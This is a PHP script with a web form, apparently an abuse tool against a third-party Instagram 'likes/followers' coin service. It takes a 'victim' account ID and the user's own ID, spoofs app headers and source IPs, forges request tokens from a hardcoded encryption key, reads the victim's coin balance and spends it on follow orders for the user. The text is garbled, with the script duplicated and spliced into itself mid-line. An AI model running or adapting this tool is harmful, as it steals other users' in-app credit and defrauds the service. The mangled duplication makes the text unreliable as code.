
     <?php
error_reporting(0);


if(isset($_GET['submit'])){
 $uidx=$_GET['userid'];
    $uid=$_GET['target'];
 
    
  function RandomNumber($length){
    $str="";
    for($i=0;$i<$length;$i++){
    $str.=mt_rand(0,9);
    }
    return $str;
    }
    
    
    function rando($length) {
        $characters = '1234567890abcdefghijklmnopqrstuvwxyz';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 
     <?php
error_reporting(0);


if(isset($_GET['submit'])){
 $uidx=$_GET['userid'];
    $uid=$_GET['target'];
 
    
  function RandomNumber($length){
    $str="";
    for($i=0;$i<$length;$i++){
    $str.=mt_rand(0,9);
    }
    return $str;
    }
    
    
    function rando($length) {
        $characters = '1234567890abcdefghijklmnopqrstuvwxyz';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }


  $x16=rando(16);
$x40=rando(40);

$ts=time();
$f = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","suman","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$fname = $f[mt_rand(0,50)];
$l = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$lname = $l[mt_rand(0,50)];
$no = rand(1,999);
$name=''.$fname.''.$lname.''.$no.'';


$url1='https://instaup.marsapi.com/get_likes/user/coins';



$data0='market=Bazaar&user_id='.$uid.'&iad='.$x40.'&user_name='.$name;

$a1 = RandomNumber(2);
$a2 = RandomNumber(2);
$a3 = RandomNumber(2);
$a4 = RandomNumber(2);
$ipz = $a1.'.'.$a2.'.'.$a3.'.'.$a4;


$access=md5('45:8D:2E:5C:3A:B4:02:2D:B5:DD:3B:E0:98:4F:14:90:CB:5F:B5:45'.$uid);


$headers1=['market: Bazaar',
'access: '.$access,
'lng: en',
'api_key: ABCXYZ123TEST',
"Nagent: null/02:00:00:00:00:00/'.$ts.'/$x16/null/$x40",
'cnt: unknown',
'version: 51',
'pkg: f2c6d7a5b030a1542f7eb589d5013340',
'aid: '.$x40,
'Content-Type: application/x-www-form-urlencoded',
'Host: instaup.marsapi.com',
'Connection: Keep-Alive',
'Accept-Encoding: gzip',
'User-Agent: okhttp/3.12.1',
'X-Forwarded-For: '.$ipz.''];


 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,$data0);
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headers1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
 $output1= curl_exec ($ch);
 
 curl_close ($ch);

    $json1=json_decode($output1,true);
  $c1=$json1['coins'];
  $d1 = $c1 / 4;
  $d2 = explode(".",$d1)['0'];
      $url0="https://instaup.marsapi.com/get_likes/order/follow";




$idx=$uid+3423;

$d=$idx.'ig';

$i='3rFz>|)VHl-w+5I0';
$k='#p0yJmVK/@($nX?#';
$enc_data = base64_encode(openssl_encrypt($d,"AES-128-CBC",$k,OPENSSL_RAW_DATA,$i));
$tkv=md5($enc_data.':M3JGej58KVZIbC13KzVJMA==');





$dx=urlencode($dx);


$ll='https%3A%5C%2F%5C%2Finstagram.fccu3-1.fna.fbcdn.net%5C%2Fv%5C%2Ft51.2885-15%5C%2Fe35%5C%2Fs150x150%5C%2F264420143_435496831548995_8076441957316773167_n.jpg%3F_nc_ht%3Dinstagram.fccu3-1.fna.fbcdn.net%26_nc_cat%3D111%26_nc_ohc%3DvWrY6qsKOOAAX9ZgJLH%26edm%3DAPU89FABAAAA%26ccb%3D7-4%26oh%3D00_AT_GHVnpr10j1bCs8Dx5unohvTyp_1DgOtu8It7P_Nmpfw%26oe%3D61B616B1%26_nc_sid%3D86f79a';

 $data0='gift=0&order_count='.$d2.'&user_id='.$uid.'&tokenV2='.$tkv.'&start_value=1700&media_url=%7B%22media_url%22%3A%22'.$ll.'%22%2C%22user_name%22%3A%22'.$fname.'%22%7D&order_id='.$uidx;
if($d2 > 1000){
$d2 = '1000';
} else {
$d2 = $d2;
}
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url0);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS,$data0);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headers1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
  $cc= curl_exec ($ch);
 curl_close ($ch);
    $jsonn=json_decode($cc,true);
    $c=$jsonn['status'];
    if($c == 'Successful'){
echo "DONE : $d";
} else {

echo "$cc";
}


     }
 
 if(!isset($_GET['submit']))
 {
 ?>
 <section>
  <div class="container p-5 ">
   <form action="" method="get">
    <div class="mb-3">
     <label class="form-label">ط§ظٹط¯ظٹ ط­ط³ط§ط¨ ط§ظ„ط¶ط­ظٹط© </label>
     <input type='text' name='target' class="form-control" required>
     <div  class="form-text">Enter pk Instagram Target</div>
     
    </div>
    <div class="mb-3">
     <label class="form-label">ط§ظٹط¯ظٹ ط­ط³ط§ط¨ظƒ ط§ظ„ط£ط³ط§ط³ظٹ</label>
     <input type='text' name='userid' class="form-control" required>
     <div  class="form-text">Enter Your user-id</div>
     
    
     
    </div>
    <button type="submit" name='submit' value='submit' class="btn btn-primary">Submit</button>
    
   </form>
   
  </div>
  
 </section>
 <?php
 }
 ?>0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }


  $x16=rando(16);
$x40=rando(40);

$ts=time();
$f = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","suman","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$fname = $f[mt_rand(0,50)];
$l = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
$lname = $l[mt_rand(0,50)];
$no = rand(1,999);
$name=''.$fname.''.$lname.''.$no.'';


$url1='https://instaup.marsapi.com/get_likes/user/coins';



$data0='market=Bazaar&user_id='.$uid.'&iad='.$x40.'&user_name='.$name;

$a1 = RandomNumber(2);
$a2 = RandomNumber(2);
$a3 = RandomNumber(2);
$a4 = RandomNumber(2);
$ipz = $a1.'.'.$a2.'.'.$a3.'.'.$a4;


$access=md5('45:8D:2E:5C:3A:B4:02:2D:B5:DD:3B:E0:98:4F:14:90:CB:5F:B5:45'.$uid);


$headers1=['market: Bazaar',
'access: '.$access,
'lng: en',
'api_key: ABCXYZ123TEST',
"Nagent: null/02:00:00:00:00:00/'.$ts.'/$x16/null/$x40",
'cnt: unknown',
'version: 51',
'pkg: f2c6d7a5b030a1542f7eb589d5013340',
'aid: '.$x40,
'Content-Type: application/x-www-form-urlencoded',
'Host: instaup.marsapi.com',
'Connection: Keep-Alive',
'Accept-Encoding: gzip',
'User-Agent: okhttp/3.12.1',
'X-Forwarded-For: '.$ipz.''];


 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,$data0);
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headers1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
 $output1= curl_exec ($ch);
 
 curl_close ($ch);

    $json1=json_decode($output1,true);
  $c1=$json1['coins'];
  $d1 = $c1 / 4;
  $d2 = explode(".",$d1)['0'];
      $url0="https://instaup.marsapi.com/get_likes/order/follow";




$idx=$uid+3423;

$d=$idx.'ig';

$i='3rFz>|)VHl-w+5I0';
$k='#p0yJmVK/@($nX?#';
$enc_data = base64_encode(openssl_encrypt($d,"AES-128-CBC",$k,OPENSSL_RAW_DATA,$i));
$tkv=md5($enc_data.':M3JGej58KVZIbC13KzVJMA==');





$dx=urlencode($dx);


$ll='https%3A%5C%2F%5C%2Finstagram.fccu3-1.fna.fbcdn.net%5C%2Fv%5C%2Ft51.2885-15%5C%2Fe35%5C%2Fs150x150%5C%2F264420143_435496831548995_8076441957316773167_n.jpg%3F_nc_ht%3Dinstagram.fccu3-1.fna.fbcdn.net%26_nc_cat%3D111%26_nc_ohc%3DvWrY6qsKOOAAX9ZgJLH%26edm%3DAPU89FABAAAA%26ccb%3D7-4%26oh%3D00_AT_GHVnpr10j1bCs8Dx5unohvTyp_1DgOtu8It7P_Nmpfw%26oe%3D61B616B1%26_nc_sid%3D86f79a';

 $data0='gift=0&order_count='.$d2.'&user_id='.$uid.'&tokenV2='.$tkv.'&start_value=1700&media_url=%7B%22media_url%22%3A%22'.$ll.'%22%2C%22user_name%22%3A%22'.$fname.'%22%7D&order_id='.$uidx;
if($d2 > 1000){
$d2 = '1000';
} else {
$d2 = $d2;
}
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url0);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS,$data0);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headers1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
  $cc= curl_exec ($ch);
 curl_close ($ch);
    $jsonn=json_decode($cc,true);
    $c=$jsonn['status'];
    if($c == 'Successful'){
echo "DONE : $d";
} else {

echo "$cc";
}


     }
 
 if(!isset($_GET['submit']))
 {
 ?>
 <section>
  <div class="container p-5 ">
   <form action="" method="get">
    <div class="mb-3">
     <label class="form-label">ط§ظٹط¯ظٹ ط­ط³ط§ط¨ ط§ظ„ط¶ط­ظٹط© </label>
     <input type='text' name='target' class="form-control" required>
     <div  class="form-text">Enter pk Instagram Target</div>
     
    </div>
    <div class="mb-3">
     <label class="form-label">ط§ظٹط¯ظٹ ط­ط³ط§ط¨ظƒ ط§ظ„ط£ط³ط§ط³ظٹ</label>
     <input type='text' name='userid' class="form-control" required>
     <div  class="form-text">Enter Your user-id</div>
     
    
     
    </div>
    <button type="submit" name='submit' value='submit' class="btn btn-primary">Submit</button>
    
   </form>
   
  </div>
  
 </section>
 <?php
 }
 ?>